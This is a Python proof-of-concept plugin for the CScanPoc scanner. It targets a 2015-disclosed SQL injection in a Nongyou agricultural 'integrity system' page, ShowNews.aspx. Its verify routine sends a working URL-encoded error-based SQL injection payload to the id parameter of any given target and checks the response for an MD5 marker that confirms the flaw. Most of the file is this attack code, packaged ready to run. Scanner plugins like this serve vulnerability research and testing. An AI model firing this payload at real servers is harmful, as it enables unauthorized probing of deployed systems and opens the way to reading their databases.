# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Nongyou_0016'  # 平台漏洞编号，留空
    name = '某农业廉洁系统存在SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-12'  # 漏洞公布时间
    desc = '''
        农友软件多年来致力于农村、农业、农民的“三农”信息化建设，是国内领先的“三农”信息化建设全面解决方案提供商，同时也是国内最大的“三农”信息化服务提供商。
        某农业廉洁系统存在SQL注入漏洞。
        /ExtWebModels/WebFront/ShowNews.aspx?class=1&id=1
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=086880'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Nongyou'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f0f67715-2839-47b8-a896-8a9ab859ea6d'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vun_url = arg+"/ExtWebModels/WebFront/ShowNews.aspx?class=1&id=1"
            payload = "%27%20AND%20%28SELECT%206765%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%281%29%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27QXgv%27%3D%27QXgv"
            code, head, res, errcode, finalurl = hh.http(vun_url+payload)
            if "c4ca4238a0b923820dcc509a6f75849b" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
